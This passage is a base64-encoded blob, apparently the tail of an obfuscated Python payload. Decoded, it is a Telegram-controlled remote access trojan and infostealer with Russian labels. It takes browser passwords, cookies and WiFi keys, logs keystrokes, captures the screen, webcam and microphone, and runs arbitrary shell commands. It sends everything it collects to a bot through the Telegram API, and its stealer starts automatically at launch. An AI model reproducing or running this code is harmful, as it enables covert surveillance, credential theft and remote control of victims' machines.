0byIsCiAgICAgICAgICAgICAgICBmaWxlcz17InBob3RvIjogKCJzY3JlZW5zaG90LnBuZyIsIHBob3RvX2RhdGEpfSwgZGF0YT17ImNoYXRfaWQiOiBURUxFR1JBTV9DSEFUX0lELCAiY2FwdGlvbiI6IGNhcHRpb259KQogICAgICAgIGV4Y2VwdDogcGFzcwoKICAgIGRlZiBzZW5kX2RvY3VtZW50KHNlbGYsIGZpbGVfZGF0YSwgZmlsZW5hbWUsIGNhcHRpb249IiIpOgogICAgICAgIHRyeToKICAgICAgICAgICAgcmVxdWVzdHMucG9zdChmImh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3R7VEVMRUdSQU1fQk9UX1RPS0VOfS9zZW5kRG9jdW1lbnQiLAogICAgICAgICAgICAgICAgZmlsZXM9eyJkb2N1bWVudCI6IChmaWxlbmFtZSwgZmlsZV9kYXRhKX0sIGRhdGE9eyJjaGF0X2lkIjogVEVMRUdSQU1fQ0hBVF9JRCwgImNhcHRpb24iOiBjYXB0aW9ufSkKICAgICAgICBleGNlcHQ6IHBhc3MKCiAgICBkZWYgZ2V0X3VwZGF0ZXMoc2VsZik6CiAgICAgICAgdHJ5OgogICAgICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLmdldChmImh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3R7VEVMRUdSQU1fQk9UX1RPS0VOfS9nZXRVcGRhdGVzIiwKICAgICAgICAgICAgICAgIHBhcmFtcz17Im9mZnNldCI6IHNlbGYubGFzdF91cGRhdGVfaWQgKyAxLCAidGltZW91dCI6IDMwfSwgdGltZW91dD0zNSkKICAgICAgICAgICAgcmV0dXJuIHJlc3BvbnNlLmpzb24oKS5nZXQoInJlc3VsdCIsIFtdKQogICAgICAgIGV4Y2VwdDogcmV0dXJuIFtdCgogICAgZGVmIGNyZWF0ZV9rZXlib2FyZChzZWxmKToKICAgICAgICByZXR1cm4geyJpbmxpbmVfa2V5Ym9hcmQiOiBbCiAgICAgICAgICAgIFt7InRleHQiOiAi8J+UkSDQo9C60YDQsNGB0YLRjCDQv9Cw0YDQvtC70LgiLCAiY2FsbGJhY2tfZGF0YSI6ICJzdGVhbF9wYXNzd29yZHMifSwgeyJ0ZXh0IjogIvCfk7gg0KHQutGA0LjQvdGI0L7RgiIsICJjYWxsYmFja19kYXRhIjogInNjcmVlbnNob3QifV0sCiAgICAgICAgICAgIFt7InRleHQiOiAi8J+OpSDQktC10LHQutCw0LzQtdGA0LAiLCAiY2FsbGJhY2tfZGF0YSI6ICJ3ZWJjYW0ifSwgeyJ0ZXh0IjogIuKMqO+4jyDQmtC10LnQu9C+0LPQs9C10YAg0JLQmtCbIiwgImNhbGxiYWNrX2RhdGEiOiAia2V5bG9nZ2VyX3N0YXJ0In1dLAogICAgICAgICAgICBbeyJ0ZXh0IjogIuKPue+4jyDQmtC10LnQu9C+0LPQs9C10YAg0JLQq9Ca0JsiLCAiY2FsbGJhY2tfZGF0YSI6ICJrZXlsb2dnZXJfc3RvcCJ9LCB7InRleHQiOiAi8J+TgSDQn9C+0LvRg9GH0LjRgtGMINC70L7QsyIsICJjYWxsYmFja19kYXRhIjogImtleWxvZ2dlcl9nZXQifV0sCiAgICAgICAgICAgIFt7InRleHQiOiAi8J+SuyDQodC40YHRgtC10LzQvdCw0Y8g0LjQvdGE0L7RgNC80LDRhtC40Y8iLCAiY2FsbGJhY2tfZGF0YSI6ICJzeXN0ZW1faW5mbyJ9LCB7InRleHQiOiAi8J+TtiBXaUZpINC/0LDRgNC+0LvQuCIsICJjYWxsYmFja19kYXRhIjogIndpZmlfcGFzc3dvcmRzIn1dLAogICAgICAgICAgICBbeyJ0ZXh0IjogIuKaoSDQmtC+0LzQsNC90LTQvdCw0Y8g0YHRgtGA0L7QutCwIiwgImNhbGxiYWNrX2RhdGEiOiAic2hlbGwifSwgeyJ0ZXh0IjogIvCfk4Eg0KHQutCw0YfQsNGC0Ywg0YTQsNC50LsiLCAiY2FsbGJhY2tfZGF0YSI6ICJkb3dubG9hZF9maWxlIn1dLAogICAgICAgICAgICBbeyJ0ZXh0IjogIvCfk6Qg0JfQsNCz0YDRg9C30LjRgtGMINGE0LDQudC7IiwgImNhbGxiYWNrX2RhdGEiOiAidXBsb2FkX2ZpbGUifSwgeyJ0ZXh0IjogIvCfk4og0J/RgNC+0YbQtdGB0YHRiyIsICJjYWxsYmFja19kYXRhIjogInByb2Nlc3NfbGlzdCJ9XSwKICAgICAgICAgICAgW3sidGV4dCI6ICLwn5S0INCS0YvQutC70Y7Rh9C40YLRjCDQn9CaIiwgImNhbGxiYWNrX2RhdGEiOiAic2h1dGRvd24ifSwgeyJ0ZXh0IjogIvCflIQg0J/QtdGA0LXQt9Cw0LPRgNGD0LfQuNGC0YwiLCAiY2FsbGJhY2tfZGF0YSI6ICJyZXN0YXJ0In1dLAogICAgICAgICAgICBbeyJ0ZXh0IjogIvCflJIg0JfQsNCx0LvQvtC60LjRgNC+0LLQsNGC0Ywg0Y3QutGA0LDQvSIsICJjYWxsYmFja19kYXRhIjogImxvY2tfc2NyZWVuIn0sIHsidGV4dCI6ICLwn46Z77iPINCX0LDQv9C40YHRjCDQt9Cy0YPQutCwINCS0JrQmyIsICJjYWxsYmFja19kYXRhIjogImF1ZGlvX3N0YXJ0In1dLAogICAgICAgICAgICBbeyJ0ZXh0IjogIuKPue+4jyDQl9Cw0L/QuNGB0Ywg0LfQstGD0LrQsCDQktCr0JrQmyIsICJjYWxsYmFja19kYXRhIjogImF1ZGlvX3N0b3AifSwgeyJ0ZXh0IjogIvCfk4Eg0J/QvtC70YPRh9C40YLRjCDQt9Cw0L/QuNGB0YwiLCAiY2FsbGJhY2tfZGF0YSI6ICJhdWRpb19nZXQifV0sCiAgICAgICAgICAgIFt7InRleHQiOiAi8J+agCDQn9Ce0JvQndCr0Jkg0KHQmtCQ0J0iLCAiY2FsbGJhY2tfZGF0YSI6ICJmdWxsX3NjYW4ifV0KICAgICAgICBdfQoKICAgIGRlZiBzZW5kX21haW5fbWVudShzZWxmKToKICAgICAgICBtZW51X3RleHQgPSBmIvCfpJYgKtCj0JTQkNCb0JXQndCd0J7QlSDQo9Cf0KDQkNCS0JvQldCd0JjQlSpcblxu8J+SuyAq0KHQuNGB0YLQtdC80LA6KiB7cGxhdGZvcm0ubm9kZSgpfVxu8J+RpCAq0J/QvtC70YzQt9C+0LLQsNGC0LXQu9GMOioge2dldHBhc3MuZ2V0dXNlcigpfVxu8J+Wpe+4jyAq0J7QoToqIHtwbGF0Zm9ybS5zeXN0ZW0oKX0ge3BsYXRmb3JtLnJlbGVhc2UoKX1cblxu0JLRi9Cx0LXRgNC40YLQtSDQtNC10LnRgdGC0LLQuNC1OiIKICAgICAgICBzZWxmLnNlbmRfbWVzc2FnZShtZW51X3RleHQsIHNlbGYuY3JlYXRlX2tleWJvYXJkKCkpCgogICAgZGVmIHN0ZWFsX3Bhc3N3b3Jkc19jb21tYW5kKHNlbGYpOgogICAgICAgIHNlbGYuc2VuZF9tZXNzYWdlKCLwn5SEINCa0YDQsNC00YMg0L/QsNGA0L7Qu9C4Li4uIik7IHN0ZWFsZXIgPSBBZHZhbmNlZFN0ZWFsZXIoKQogICAgICAgIHN0ZWFsZXIuc3RlYWxfYnJvd3Nlcl9wYXNzd29yZHMoKTsgc3RlYWxlci5zdGVhbF9jb29raWVzKCkKICAgICAgICBpZiBzdGVhbGVyLmRhdGFbInBhc3N3b3JkcyJdOgogICAgICAgICAgICBwYXNzd29yZHNfdGV4dCA9ICLwn5SRICrQndCw0LnQtNC10L3QvdGL0LUg0L/QsNGA0L7Qu9C4OipcblxuIgogICAgICAgICAgICBmb3IgcHdkIGluIHN0ZWFsZXIuZGF0YVsicGFzc3dvcmRzIl1bOjE1XToKICAgICAgICAgICAgICAgIHBhc3N3b3Jkc190ZXh0ICs9IGYiKntwd2RbJ2Jyb3dzZXInXX06Klxu8J+MkCBge3B3ZFsndXJsJ119YFxu8J+RpCBge3B3ZFsndXNlcm5hbWUnXX1gXG7wn5SQIGB7cHdkWydwYXNzd29yZCddfWBcblxuIgogICAgICAgICAgICBzZWxmLnNlbmRfbWVzc2FnZShwYXNzd29yZHNfdGV4dFs6NDAwMF0pCiAgICAgICAgZWxzZTogc2VsZi5zZW5kX21lc3NhZ2UoIuKdjCDQn9Cw0YDQvtC70Lgg0L3QtSDQvdCw0LnQtNC10L3RiyIpCgogICAgZGVmIHNjcmVlbnNob3RfY29tbWFuZChzZWxmKToKICAgICAgICBzZWxmLnNlbmRfbWVzc2FnZSgi8J+TuCDQlNC10LvQsNGOINGB0LrRgNC40L3RiNC+0YIuLi4iKQogICAgICAgIHRyeToKICAgICAgICAgICAgc2NyZWVuc2hvdCA9IEltYWdlR3JhYi5ncmFiKCk7IHNjcmVlbnNob3RfcGF0aCA9IG9zLnBhdGguam9pbih0ZW1wZmlsZS5nZXR0ZW1wZGlyKCksICJ0Z19zY3JlZW5zaG90LnBuZyIpCiAgICAgICAgICAgIHNjcmVlbnNob3Quc2F2ZShzY3JlZW5zaG90X3BhdGgpCiAgICAgICAgICAgIHdpdGggb3BlbihzY3JlZW5zaG90X3BhdGgsICJyYiIpIGFzIGY6IHNlbGYuc2VuZF9waG90byhmLnJlYWQoKSwgIvCfk7gg0JDQutGC0YPQsNC70YzQvdGL0Lkg0YHQutGA0LjQvdGI0L7RgiIpCiAgICAgICAgICAgIG9zLnJlbW92ZShzY3JlZW5zaG90X3BhdGgpCiAgICAgICAgZXhjZXB0OiBzZWxmLnNlbmRfbWVzc2FnZSgi4p2MINCe0YjQuNCx0LrQsCDRgdC60YDQuNC90YjQvtGC0LAiKQoKICAgIGRlZiB3ZWJjYW1fY29tbWFuZChzZWxmKToKICAgICAgICBzZWxmLnNlbmRfbWVzc2FnZSgi8J+OpSDQn9GL0YLQsNGO0YHRjCDRgdC00LXQu9Cw0YLRjCDRhNC+0YLQviDRgSDQstC10LHQutCw0LzQtdGA0YsuLi4iKQogICAgICAgIHRyeToKICAgICAgICAgICAgY2FwID0gY3YyLlZpZGVvQ2FwdHVyZSgwKTsgcmV0LCBmcmFtZSA9IGNhcC5yZWFkKCkKICAgICAgICAgICAgaWYgcmV0OgogICAgICAgICAgICAgICAgd2ViY2FtX3BhdGggPSBvcy5wYXRoLmpvaW4odGVtcGZpbGUuZ2V0dGVtcGRpcigpLCAid2ViY2FtLmpwZyIpOyBjdjIuaW13cml0ZSh3ZWJjYW1fcGF0aCwgZnJhbWUpCiAgICAgICAgICAgICAgICB3aXRoIG9wZW4od2ViY2FtX3BhdGgsICJyYiIpIGFzIGY6IHNlbGYuc2VuZF9waG90byhmLnJlYWQoKSwgIvCfjqUg0KTQvtGC0L4g0YEg0LLQtdCx0LrQsNC80LXRgNGLIikKICAgICAgICAgICAgICAgIG9zLnJlbW92ZSh3ZWJjYW1fcGF0aCkKICAgICAgICAgICAgY2FwLnJlbGVhc2UoKQogICAgICAgIGV4Y2VwdDogc2VsZi5zZW5kX21lc3NhZ2UoIuKdjCDQktC10LHQutCw0LzQtdGA0LAg0L3QtdC00L7RgdGC0YPQv9C90LAiKQoKICAgIGRlZiBrZXlsb2dnZXJfc3RhcnRfY29tbWFuZChzZWxmKToKICAgICAgICBpZiBzZWxmLmtleWxvZ2dlci5zdGFydCgpOiBzZWxmLnNlbmRfbWVzc2FnZSgi4oyo77iPINCa0LXQudC70L7Qs9Cz0LXRgCDQkNCa0KLQmNCS0JjQoNCe0JLQkNCdIikKICAgICAgICBlbHNlOiBzZWxmLnNlbmRfbWVzc2FnZSgi4p2MINCe0YjQuNCx0LrQsCDQsNC60YLQuNCy0LDRhtC40LgiKQoKICAgIGRlZiBrZXlsb2dnZXJfc3RvcF9jb21tYW5kKHNlbGYpOiBzZWxmLmtleWxvZ2dlci5zdG9wKCk7IHNlbGYuc2VuZF9tZXNzYWdlKCLij7nvuI8g0JrQtdC50LvQvtCz0LPQtdGAINCe0KHQotCQ0J3QntCS0JvQldCdIikKCiAgICBkZWYga2V5bG9nZ2VyX2dldF9jb21tYW5kKHNlbGYpOgogICAgICAgIHNlbGYuc2VuZF9tZXNzYWdlKCLwn5OBINCe0YLQv9GA0LDQstC70Y/RjiDQu9C+0LMuLi4iKQogICAgICAgIHRyeToKICAgICAgICAgICAgbG9nX3BhdGggPSBvcy5wYXRoLmpvaW4odGVtcGZpbGUuZ2V0dGVtcGRpcigpLCAia2V5bG9nLnR4dCIpCiAgICAgICAgICAgIGlmIG9zLnBhdGguZXhpc3RzKGxvZ19wYXRoKToKICAgICAgICAgICAgICAgIHdpdGggb3Blbihsb2dfcGF0aCwgInJiIikgYXMgZjogc2VsZi5zZW5kX2RvY3VtZW50KGYucmVhZCgpLCAia2V5bG9nLnR4dCIsICLijKjvuI8g0JvQvtCzINC60LXQudC70L7Qs9Cz0LXRgNCwIikKICAgICAgICAgICAgZWxzZTogc2VsZi5zZW5kX21lc3NhZ2UoIuKdjCDQpNCw0LnQuyDQu9C+0LPQsCDQvdC1INC90LDQudC00LXQvSIpCiAgICAgICAgZXhjZXB0OiBzZWxmLnNlbmRfbWVzc2FnZSgi4p2MINCe0YjQuNCx0LrQsCDQvtGC0L/RgNCw0LLQutC4IikKCiAgICBkZWYgc3lzdGVtX2luZm9fY29tbWFuZChzZWxmKToKICAgICAgICBzZWxmLnNlbmRfbWVzc2FnZSgi8J+SuyDQodC+0LHQuNGA0LDRjiDQuNC90YTQvtGA0LzQsNGG0LjRji4uLiIpCiAgICAgICAgdHJ5OgogICAgICAgICAgICBpbmZvX3RleHQgPSBmIirwn5K7INCh0JjQodCi0JXQnNCd0JDQryDQmNCd0KTQntCg0JzQkNCm0JjQrypcblxuKvCfkaQg0J/QvtC70YzQt9C+0LLQsNGC0LXQu9GMOioge2dldHBhc3MuZ2V0dXNlcigpfVxuKvCflqXvuI8g0JjQvNGPINCf0Jo6KiB7cGxhdGZvcm0ubm9kZSgpfVxuKuKame+4jyDQntChOioge3BsYXRmb3JtLnN5c3RlbSgpfSB7cGxhdGZvcm0ucmVsZWFzZSgpfVxuKvCflKcg0JDRgNGF0LjRgtC10LrRgtGD0YDQsDoqIHtwbGF0Zm9ybS5hcmNoaXRlY3R1cmUoKVswXX1cbirwn5K+INCf0YDQvtGG0LXRgdGB0L7RgDoqIHtwbGF0Zm9ybS5wcm9jZXNzb3IoKX1cbirwn5OBINCg0LDQsdC+0YfQsNGPINC00LjRgNC10LrRgtC+0YDQuNGPOioge29zLmdldGN3ZCgpfVxuKvCflZAg0JLRgNC10LzRjyDRgdC40YHRgtC10LzRizoqIHtkYXRldGltZS5kYXRldGltZS5ub3coKX1cbirwn4yQIElQINCw0LTRgNC10YE6KiB7c29ja2V0LmdldGhvc3RieW5hbWUoc29ja2V0LmdldGhvc3RuYW1lKCkpfSIKICAgICAgICAgICAgc2VsZi5zZW5kX21lc3NhZ2UoaW5mb190ZXh0KQogICAgICAgIGV4Y2VwdDogc2VsZi5zZW5kX21lc3NhZ2UoIuKdjCDQntGI0LjQsdC60LAiKQoKICAgIGRlZiB3aWZpX3Bhc3N3b3Jkc19jb21tYW5kKHNlbGYpOgogICAgICAgIHNlbGYuc2VuZF9tZXNzYWdlKCLwn5O2INCY0YnRgyBXaUZpINC/0LDRgNC+0LvQuC4uLiIpOyBzdGVhbGVyID0gQWR2YW5jZWRTdGVhbGVyKCk7IHN0ZWFsZXIuZ2V0X3dpZmlfcGFzc3dvcmRzKCkKICAgICAgICBpZiBzdGVhbGVyLmRhdGFbIndpZmlfcGFzc3dvcmRzIl06CiAgICAgICAgICAgIHdpZmlfdGV4dCA9ICLwn5O2ICrQndCw0LnQtNC10L3QvdGL0LUgV2lGaSDRgdC10YLQuDoqXG5cbiIKICAgICAgICAgICAgZm9yIHdpZmkgaW4gc3RlYWxlci5kYXRhWyJ3aWZpX3Bhc3N3b3JkcyJdOiB3aWZpX3RleHQgKz0gZiIqe3dpZmlbJ3NzaWQnXX0qIC0gYHt3aWZpWydwYXNzd29yZCddfWBcbiIKICAgICAgICAgICAgc2VsZi5zZW5kX21lc3NhZ2Uod2lmaV90ZXh0KQogICAgICAgIGVsc2U6IHNlbGYuc2VuZF9tZXNzYWdlKCLinYwgV2lGaSDQv9Cw0YDQvtC70Lgg0L3QtSDQvdCw0LnQtNC10L3RiyIpCgogICAgZGVmIHNoZWxsX2NvbW1hbmQoc2VsZik6IHNlbGYuc2VuZF9tZXNzYWdlKCLimqEg0KDQtdC20LjQvCDQutC+0LzQsNC90LTQvdC+0Lkg0YHRgtGA0L7QutC4INCw0LrRgtC40LLQuNGA0L7QstCw0L0uINCe0YLQv9GA0LDQstC70Y/QudGC0LUg0LrQvtC80LDQvdC00Ysg0LIg0YfQsNGCLiIpCiAgICBkZWYgZG93bmxvYWRfZmlsZV9jb21tYW5kKHNlbGYpOiBzZWxmLnNlbmRfbWVzc2FnZSgi8J+TgSDQoNC10LbQuNC8INGB0LrQsNGH0LjQstCw0L3QuNGPINCw0LrRgtC40LLQuNGA0L7QstCw0L0uINCe0YLQv9GA0LDQstGM0YLQtSDQv9C+0LvQvdGL0Lkg0L/Rg9GC0Ywg0Log0YTQsNC50LvRgy4iKQogICAgZGVmIHVwbG9hZF9maWxlX2NvbW1hbmQoc2VsZik6IHNlbGYuc2VuZF9tZXNzYWdlKCLwn5OkINCg0LXQttC40Lwg0LfQsNCz0YDRg9C30LrQuCDQsNC60YLQuNCy0LjRgNC+0LLQsNC9LiDQntGC0L/RgNCw0LLRjNGC0LUg0YTQsNC50Lsg0LIgVGVsZWdyYW0uIikKCiAgICBkZWYgcHJvY2Vzc19saXN0X2NvbW1hbmQoc2VsZik6CiAgICAgICAgc2VsZi5zZW5kX21lc3NhZ2UoIvCfk4og0J/QvtC70YPRh9Cw0Y4g0YHQv9C40YHQvtC6INC/0YDQvtGG0LXRgdGB0L7Qsi4uLiIpCiAgICAgICAgdHJ5OgogICAgICAgICAgICBpZiBwbGF0Zm9ybS5zeXN0ZW0oKSA9PSAiV2luZG93cyI6IHJlc3VsdCA9IHN1YnByb2Nlc3MuY2hlY2tfb3V0cHV0KCJ0YXNrbGlzdCIsIHNoZWxsPVRydWUpLmRlY29kZSgnY3A4NjYnKQogICAgICAgICAgICBlbHNlOiByZXN1bHQgPSBzdWJwcm9jZXNzLmNoZWNrX291dHB1dCgicHMgYXV4Iiwgc2hlbGw9VHJ1ZSkuZGVjb2RlKCkKICAgICAgICAgICAgc2VsZi5zZW5kX21lc3NhZ2UoZiJgYGBcbntyZXN1bHRbOjQwMDBdfVxuYGBgIikKICAgICAgICBleGNlcHQ6IHNlbGYuc2VuZF9tZXNzYWdlKCLinYwg0J7RiNC40LHQutCwIikKCiAgICBkZWYga2lsbF9wcm9jZXNzX2NvbW1hbmQoc2VsZik6IHNlbGYuc2VuZF9tZXNzYWdlKCLwn5SqINCU0LvRjyDQt9Cw0LLQtdGA0YjQtdC90LjRjyDQv9GA0L7RhtC10YHRgdCwINC+0YLQv9GA0LDQstGM0YLQtSDQtdCz0L4gUElEINC40LvQuCDQuNC80Y8uIikKCiAgICBkZWYgc2h1dGRvd25fY29tbWFuZChzZWxmKToKICAgICAgICBzZWxmLnNlbmRfbWVzc2FnZSgi8J+UtCDQktGL0LrQu9GO0YfQsNGOINC60L7QvNC/0YzRjtGC0LXRgC4uLiIpCiAgICAgICAgdHJ5OgogICAgICAgICAgICBpZiBwbGF0Zm9ybS5zeXN0ZW0oKSA9PSAiV2luZG93cyI6IG9zLnN5c3RlbSgic2h1dGRvd24gL3MgL3QgNSIpCiAgICAgICAgICAgIGVsc2U6IG9zLnN5c3RlbSgic2h1dGRvd24gLWggbm93IikKICAgICAgICBleGNlcHQ6IHBhc3MKCiAgICBkZWYgcmVzdGFydF9jb21tYW5kKHNlbGYpOgogICAgICAgIHNlbGYuc2VuZF9tZXNzYWdlKCLwn5SEINCf0LXRgNC10LfQsNCz0YDRg9C20LDRjiDQutC+0LzQv9GM0Y7RgtC10YAuLi4iKQogICAgICAgIHRyeToKICAgICAgICAgICAgaWYgcGxhdGZvcm0uc3lzdGVtKCkgPT0gIldpbmRvd3MiOiBvcy5zeXN0ZW0oInNodXRkb3duIC9yIC90IDUiKQogICAgICAgICAgICBlbHNlOiBvcy5zeXN0ZW0oInJlYm9vdCIpCiAgICAgICAgZXhjZXB0OiBwYXNzCgogICAgZGVmIGxvY2tfc2NyZWVuX2NvbW1hbmQoc2VsZik6CiAgICAgICAgc2VsZi5zZW5kX21lc3NhZ2UoIvCflJIg0JHQu9C+0LrQuNGA0YPRjiDRjdC60YDQsNC9Li4uIikKICAgICAgICB0cnk6CiAgICAgICAgICAgIGlmIHBsYXRmb3JtLnN5c3RlbSgpID09ICJXaW5kb3dzIjogb3Muc3lzdGVtKCJydW5kbGwzMi5leGUgdXNlcjMyLmRsbCxMb2NrV29ya1N0YXRpb24iKQogICAgICAgIGV4Y2VwdDogcGFzcwoKICAgIGRlZiBhdWRpb19zdGFydF9jb21tYW5kKHNlbGYpOgogICAgICAgIHNlbGYuc2VuZF9tZXNzYWdlKCLwn46Z77iPINCX0LDQv9C40YHRjCDQt9Cy0YPQutCwINCQ0JrQotCY0JLQmNCg0J7QktCQ0J3QkCAoNjAg0YHQtdC60YPQvdC0KSIpOyBzZWxmLmF1ZGlvX3JlY29yZGVyLnN0YXJ0KCkKICAgICAgICBkZWYgYXV0b19zdG9wKCk6IHRpbWUuc2xlZXAoNjApOyBzZWxmLmF1ZGlvX3N0b3BfY29tbWFuZCgpCiAgICAgICAgVGhyZWFkKHRhcmdldD1hdXRvX3N0b3ApLnN0YXJ0KCkKCiAgICBkZWYgYXVkaW9fc3RvcF9jb21tYW5kKHNlbGYpOiBzZWxmLnNlbmRfbWVzc2FnZSgi4o+577iPINCX0LDQv9C40YHRjCDQt9Cy0YPQutCwINCe0KHQotCQ0J3QntCS0JvQldCd0JAiKTsgc2VsZi5hdWRpb19yZWNvcmRlci5zdG9wKCkKCiAgICBkZWYgYXVkaW9fZ2V0X2NvbW1hbmQoc2VsZik6CiAgICAgICAgc2VsZi5zZW5kX21lc3NhZ2UoIvCfk4Eg0J7RgtC/0YDQsNCy0LvRj9GOINC30LDQv9C40YHRjC4uLiIpCiAgICAgICAgdHJ5OgogICAgICAgICAgICBhdWRpb19wYXRoID0gb3MucGF0aC5qb2luKHRlbXBmaWxlLmdldHRlbXBkaXIoKSwgImF1ZGlvX3JlY29yZC53YXYiKQogICAgICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyhhdWRpb19wYXRoKToKICAgICAgICAgICAgICAgIHdpdGggb3BlbihhdWRpb19wYXRoLCAicmIiKSBhcyBmOiBzZWxmLnNlbmRfZG9jdW1lbnQoZi5yZWFkKCksICJhdWRpb19yZWNvcmQud2F2IiwgIvCfjpnvuI8g0JfQsNC/0LjRgdGMINC30LLRg9C60LAiKQogICAgICAgICAgICBlbHNlOiBzZWxmLnNlbmRfbWVzc2FnZSgi4p2MINCk0LDQudC7INC30LDQv9C40YHQuCDQvdC1INC90LDQudC00LXQvSIpCiAgICAgICAgZXhjZXB0OiBzZWxmLnNlbmRfbWVzc2FnZSgi4p2MINCe0YjQuNCx0LrQsCDQvtGC0L/RgNCw0LLQutC4IikKCiAgICBkZWYgZnVsbF9zY2FuX2NvbW1hbmQoc2VsZik6CiAgICAgICAgc2VsZi5zZW5kX21lc3NhZ2UoIvCfmoAg0JfQkNCf0KPQodCaINCf0J7Qm9Cd0J7Qk9CeINCh0JrQkNCd0JAuLi4iKTsgc3RlYWxlciA9IEFkdmFuY2VkU3RlYWxlcigpOyBzdGVhbGVyLnJ1bigpOyBzZWxmLnNlbmRfbWVzc2FnZSgi4pyFINCh0LrQsNC90LjRgNC+0LLQsNC90LjQtSDQt9Cw0LLQtdGA0YjQtdC90L4iKQoKICAgIGRlZiBoYW5kbGVfY2FsbGJhY2soc2VsZiwgY2FsbGJhY2tfZGF0YSk6CiAgICAgICAgaGFuZGxlciA9IHNlbGYuY29tbWFuZHNfaGFuZGxlcnMuZ2V0KGNhbGxiYWNrX2RhdGEpCiAgICAgICAgaWYgaGFuZGxlcjogaGFuZGxlcigpCiAgICAgICAgZWxzZTogc2VsZi5zZW5kX21lc3NhZ2UoIuKdjCDQndC10LjQt9Cy0LXRgdGC0L3QsNGPINC60L7QvNCw0L3QtNCwIikKCiAgICBkZWYgc3RhcnRfbGlzdGVuaW5nKHNlbGYpOgogICAgICAgIHNlbGYuc2VuZF9tYWluX21lbnUoKQogICAgICAgIHdoaWxlIFRydWU6CiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIHVwZGF0ZXMgPSBzZWxmLmdldF91cGRhdGVzKCkKICAgICAgICAgICAgICAgIGZvciB1cGRhdGUgaW4gdXBkYXRlczoKICAgICAgICAgICAgICAgICAgICBzZWxmLmxhc3RfdXBkYXRlX2lkID0gdXBkYXRlWyJ1cGRhdGVfaWQiXQogICAgICAgICAgICAgICAgICAgIGlmICJjYWxsYmFja19xdWVyeSIgaW4gdXBkYXRlOiBzZWxmLmhhbmRsZV9jYWxsYmFjayh1cGRhdGVbImNhbGxiYWNrX3F1ZXJ5Il1bImRhdGEiXSkKICAgICAgICAgICAgICAgICAgICBlbGlmICJtZXNzYWdlIiBpbiB1cGRhdGUgYW5kICJ0ZXh0IiBpbiB1cGRhdGVbIm1lc3NhZ2UiXToKICAgICAgICAgICAgICAgICAgICAgICAgdGV4dCA9IHVwZGF0ZVsibWVzc2FnZSJdWyJ0ZXh0Il0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgdGV4dCA9PSAiL21lbnUiOiBzZWxmLnNlbmRfbWFpbl9tZW51KCkKICAgICAgICAgICAgICAgICAgICAgICAgZWxpZiB0ZXh0LnN0YXJ0c3dpdGgoIi9jbWQgIik6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmVzdWx0ID0gc3VicHJvY2Vzcy5jaGVja19vdXRwdXQodGV4dFs1Ol0sIHNoZWxsPVRydWUsIHN0ZGVycj1zdWJwcm9jZXNzLlNURE9VVCkuZGVjb2RlKCdjcDg2NicpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5zZW5kX21lc3NhZ2UoZiJgYGBcbntyZXN1bHRbOjQwMDBdfVxuYGBgIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZTogc2VsZi5zZW5kX21lc3NhZ2UoZiLinYwg0J7RiNC40LHQutCwOiB7c3RyKGUpfSIpCiAgICAgICAgICAgICAgICB0aW1lLnNsZWVwKDEpCiAgICAgICAgICAgIGV4Y2VwdDogdGltZS5zbGVlcCg1KQoKaWYgX19uYW1lX18gPT0gIl9fbWFpbl9fIjoKICAgIHN0ZWFsZXIgPSBBZHZhbmNlZFN0ZWFsZXIoKTsgc3RlYWxlci5ydW4oKQogICAgY29udHJvbGxlciA9IFRlbGVncmFtQ29udHJvbGxlcigpCiAgICBUaHJlYWQodGFyZ2V0PWNvbnRyb2xsZXIuc3RhcnRfbGlzdGVuaW5nKS5zdGFydCgpCiAgICB3aGlsZSBUcnVlOiB0aW1lLnNsZWVwKDYwKQo="))
